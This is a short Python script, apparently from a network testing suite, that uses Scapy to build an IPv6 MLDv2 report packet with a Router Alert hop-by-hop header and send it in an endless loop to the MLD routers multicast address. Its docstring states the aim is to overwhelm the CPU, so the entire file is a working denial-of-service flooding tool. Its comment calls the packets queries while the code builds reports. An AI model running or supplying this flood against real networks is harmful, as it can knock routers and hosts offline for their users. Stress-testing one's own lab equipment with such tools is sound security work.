#!venv/bin/python

from scapy.all import *
from scapy.all import ICMPv6MLReport2, IPv6 ,IPv6ExtHdrHopByHop, RouterAlert,ICMPv6MLDMultAddrRec
import settings
"""
Sending a flow of MLD Query to overwhelm the CPU
"""

"MLD Flooding"


base = IPv6(dst="ff02::16", hlim=1)
hbh = IPv6ExtHdrHopByHop(options = RouterAlert())
mlq = ICMPv6MLReport2(records=[ICMPv6MLDMultAddrRec(dst="FF78:6::2")])
packet=base/hbh/mlq
packet.show()

send(packet, iface=settings.source_interface, loop=1)